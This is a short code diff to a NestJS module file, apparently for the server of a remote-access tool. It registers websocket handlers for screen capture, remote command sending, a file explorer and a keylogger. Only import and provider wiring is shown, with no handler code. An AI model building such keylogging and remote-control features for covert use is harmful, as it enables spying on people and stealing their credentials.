@@ -10,9 +10,11 @@ import { WsClientResetAllConnectionsUseCase } from "./application/ws-client-rese
 import { WsClientGuard } from "./application/ws-client.guard";
 import { WsClientFile } from "./application/events/ws-client-file";
 import { WsBotModule } from "../ws-bot/ws-bot.module";
-import { WsClientGetScreens } from "./application/events/ws-client-get-screens";
+import { WsClientScreens } from "./application/events/ws-client-screens";
 import { WsClientSendCmdCommand } from "./application/events/ws-client-send-cmd-command";
 import { ClientModule } from "../client/infrastructure/client.module";
+import { WsClientGetExplorer } from "./application/events/ws-client-get-explorer";
+import { WsClientKeyLogger } from "./application/events/ws-client-keylogger";
 
 @Module({
   providers: [
@@ -24,17 +26,21 @@ import { ClientModule } from "../client/infrastructure/client.module";
     WsClientResetAllConnectionsUseCase,
     WsClientGuard,
     WsClientFile,
-    WsClientGetScreens,
+    WsClientScreens,
     WsClientSendCmdCommand,
+    WsClientGetExplorer,
+    WsClientKeyLogger,
   ],
   exports: [
     WsClientJoinsUseCase,
     WsClientLeavesUseCase,
     WsClientResetAllConnectionsUseCase,
     WsClientFile,
-    WsClientGetScreens,
+    WsClientScreens,
     WsClientSendCmdCommand,
     WsClientRepository,
+    WsClientGetExplorer,
+    WsClientKeyLogger,
   ],
   imports: [
     SchemasModule,
